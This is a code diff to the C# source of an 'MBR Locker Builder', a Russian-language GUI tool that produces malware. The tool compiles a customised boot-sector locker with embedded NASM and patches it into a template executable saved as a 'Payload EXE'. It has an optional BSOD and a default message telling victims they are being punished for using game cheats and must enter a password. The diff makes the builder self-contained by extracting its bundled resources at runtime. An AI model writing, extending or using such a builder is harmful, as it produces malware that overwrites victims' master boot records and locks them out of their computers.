@@ -4,6 +4,7 @@ using System.IO;
 using System.Windows.Forms;
 using System.Diagnostics;
 using System.Text;
+using System.Reflection;
 
 namespace MbrLockerBuilder
 {
@@ -19,11 +20,10 @@ namespace MbrLockerBuilder
         private PictureBox previewBox;
         private Label lblStatus;
         private SaveFileDialog saveFileDialog;
-        private byte[] templateBytes;
 
         public MainForm()
         {
-            this.Text = "MBR Locker Builder v3.0";
+            this.Text = "MBR Locker Builder v4.0 (Fully Autonomous)";
             this.Size = new Size(1000, 750);
             this.BackColor = Color.FromArgb(10, 15, 10);
             this.ForeColor = Color.FromArgb(0, 255, 100);
@@ -33,7 +33,6 @@ namespace MbrLockerBuilder
 
             this.InitializeComponents();
             this.LoadDefaultValues();
-            this.LoadTemplate();
             this.UpdatePreview();
         }
 
@@ -196,7 +195,7 @@ namespace MbrLockerBuilder
             this.Controls.Add(this.btnBuild);
 
             this.lblStatus = new Label();
-            this.lblStatus.Text = "Готов";
+            this.lblStatus.Text = "Готов (все ресурсы встроены)";
             this.lblStatus.Left = leftControl + 270;
             this.lblStatus.Top = y + 10;
             this.lblStatus.Width = 400;
@@ -220,29 +219,6 @@ namespace MbrLockerBuilder
                               "чит ПО в играх, и за это вы были наказаны." + Environment.NewLine + Environment.NewLine +
                               "Для разблокировки введите пароль:";
             this.txtPassword.Text = "48284dkf8";
-        }
-
-        private void LoadTemplate()
-        {
-            try
-            {
-                string templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "template.exe");
-                if (File.Exists(templatePath))
-                {
-                    this.templateBytes = File.ReadAllBytes(templatePath);
-                    this.lblStatus.Text = "Шаблон загружен";
-                }
-                else
-                {
-                    this.lblStatus.Text = "ОШИБКА: template.exe не найден в Resources!";
-                    this.templateBytes = null;
-                }
-            }
-            catch (Exception ex)
-            {
-                this.lblStatus.Text = "Ошибка загрузки шаблона: " + ex.Message;
-                this.templateBytes = null;
-            }
         }
 
         private void OnTextChanged(object sender, EventArgs e)
@@ -313,26 +289,29 @@ namespace MbrLockerBuilder
         {
             try
             {
-                if (this.templateBytes == null)
-                {
-                    MessageBox.Show("Шаблон не загружен! Убедитесь, что template.exe находится в папке Resources.",
-                        "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return;
-                }
-
-                this.lblStatus.Text = "1/5 Генерация ASM...";
+                this.lblStatus.Text = "1/6 Извлечение ресурсов...";
                 Application.DoEvents();
 
-                string asmCode = this.GenerateAsm();
+                // Извлекаем NASM из ресурсов
+                string nasmPath = this.ExtractResource("MbrLockerBuilder.Resources.nasm.exe", "nasm.exe");
+                if (string.IsNullOrEmpty(nasmPath))
+                {
+                    throw new Exception("Не удалось извлечь nasm.exe из ресурсов!");
+                }
+
+                this.lblStatus.Text = "2/6 Генерация ASM...";
+                Application.DoEvents();
+
+                string asmCode = this.GenerateAsmFromResource();
                 string asmPath = Path.Combine(Path.GetTempPath(), "locker.asm");
                 File.WriteAllText(asmPath, asmCode, Encoding.ASCII);
 
-                this.lblStatus.Text = "2/5 Компиляция NASM...";
+                this.lblStatus.Text = "3/6 Компиляция NASM...";
                 Application.DoEvents();
 
                 string binPath = Path.Combine(Path.GetTempPath(), "locker.bin");
                 Process nasm = new Process();
-                nasm.StartInfo.FileName = "nasm.exe";
+                nasm.StartInfo.FileName = nasmPath;
                 nasm.StartInfo.Arguments = $"-f bin -o \"{binPath}\" \"{asmPath}\"";
                 nasm.StartInfo.UseShellExecute = false;
                 nasm.StartInfo.RedirectStandardOutput = true;
@@ -347,7 +326,7 @@ namespace MbrLockerBuilder
                     throw new Exception("NASM Error: " + error);
                 }
 
-                this.lblStatus.Text = "3/5 Чтение бинарного файла...";
+                this.lblStatus.Text = "4/6 Чтение бинарного файла...";
                 Application.DoEvents();
 
                 byte[] mbrBytes = File.ReadAllBytes(binPath);
@@ -356,15 +335,22 @@ namespace MbrLockerBuilder
                     throw new Exception("Invalid MBR size: " + mbrBytes.Length + " bytes");
                 }
 
-                this.lblStatus.Text = "4/5 Конвертация в HEX...";
+                this.lblStatus.Text = "5/6 Конвертация в HEX...";
                 Application.DoEvents();
 
                 string hex = BitConverter.ToString(mbrBytes).Replace("-", "");
 
-                this.lblStatus.Text = "5/5 Патчинг шаблона...";
+                this.lblStatus.Text = "6/6 Патчинг шаблона...";
                 Application.DoEvents();
 
-                byte[] payloadBytes = this.PatchTemplate(hex);
+                // Извлекаем template.exe из ресурсов
+                byte[] templateBytes = this.ExtractResourceBytes("MbrLockerBuilder.Resources.template.exe");
+                if (templateBytes == null)
+                {
+                    throw new Exception("Не удалось извлечь template.exe из ресурсов!");
+                }
+
+                byte[] payloadBytes = this.PatchTemplate(templateBytes, hex);
 
                 this.saveFileDialog.Title = "Сохранить Payload EXE";
                 this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
@@ -386,6 +372,7 @@ namespace MbrLockerBuilder
 
                 try { File.Delete(asmPath); } catch { }
                 try { File.Delete(binPath); } catch { }
+                try { File.Delete(nasmPath); } catch { }
             }
             catch (Exception ex)
             {
@@ -395,26 +382,75 @@ namespace MbrLockerBuilder
             }
         }
 
-        private byte[] PatchTemplate(string mbrHex)
+        private string ExtractResource(string resourceName, string fileName)
+        {
+            try
+            {
+                string tempPath = Path.Combine(Path.GetTempPath(), fileName);
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                {
+                    if (stream == null)
+                    {
+                        throw new Exception($"Ресурс {resourceName} не найден!");
+                    }
+                    using (FileStream fs = new FileStream(tempPath, FileMode.Create, FileAccess.Write))
+                    {
+                        stream.CopyTo(fs);
+                    }
+                }
+                return tempPath;
+            }
+            catch (Exception ex)
+            {
+                this.lblStatus.Text = "Ошибка извлечения: " + ex.Message;
+                return null;
+            }
+        }
+
+        private byte[] ExtractResourceBytes(string resourceName)
+        {
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                {
+                    if (stream == null)
+                    {
+                        throw new Exception($"Ресурс {resourceName} не найден!");
+                    }
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        stream.CopyTo(ms);
+                        return ms.ToArray();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                this.lblStatus.Text = "Ошибка извлечения: " + ex.Message;
+                return null;
+            }
+        }
+
+        private byte[] PatchTemplate(byte[] templateBytes, string mbrHex)
         {
             byte[] marker = Encoding.ASCII.GetBytes("{MBR_DATA}");
-            int markerPos = this.FindPattern(this.templateBytes, marker);
+            int markerPos = this.FindPattern(templateBytes, marker);
 
             if (markerPos == -1)
             {
                 throw new Exception("Маркер {MBR_DATA} не найден в шаблоне!");
             }
 
-            byte[] result = new byte[this.templateBytes.Length - marker.Length + mbrHex.Length];
+            byte[] result = new byte[templateBytes.Length - marker.Length + mbrHex.Length];
             
-            Array.Copy(this.templateBytes, 0, result, 0, markerPos);
+            Array.Copy(templateBytes, 0, result, 0, markerPos);
             
             byte[] hexBytes = Encoding.ASCII.GetBytes(mbrHex);
             Array.Copy(hexBytes, 0, result, markerPos, hexBytes.Length);
             
             int afterMarker = markerPos + marker.Length;
-            int remaining = this.templateBytes.Length - afterMarker;
-            Array.Copy(this.templateBytes, afterMarker, result, markerPos + hexBytes.Length, remaining);
+            int remaining = templateBytes.Length - afterMarker;
+            Array.Copy(templateBytes, afterMarker, result, markerPos + hexBytes.Length, remaining);
 
             return result;
         }
@@ -437,8 +473,21 @@ namespace MbrLockerBuilder
             return -1;
         }
 
-        private string GenerateAsm()
+        private string GenerateAsmFromResource()
         {
+            string template;
+            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.locker.asm"))
+            {
+                if (stream == null)
+                {
+                    throw new Exception("Ресурс locker.asm не найден!");
+                }
+                using (StreamReader reader = new StreamReader(stream))
+                {
+                    template = reader.ReadToEnd();
+                }
+            }
+
             string title = this.txtTitle.Text.Trim();
             string body = this.txtBody.Text.Trim().Replace("\r\n", "\\r\\n").Replace("\n", "\\r\\n");
             string password = this.txtPassword.Text.Trim();
@@ -469,9 +518,6 @@ namespace MbrLockerBuilder
 
             bool enableBSOD = this.chkBSOD.Checked;
 
-            string templatePath = Path.Combine("locker", "locker.asm");
-            string template = File.ReadAllText(templatePath);
-            
             template = template.Replace("{TITLE}", title);
             template = template.Replace("{BODY}", body);
             template = template.Replace("{PASSWORD}", password);
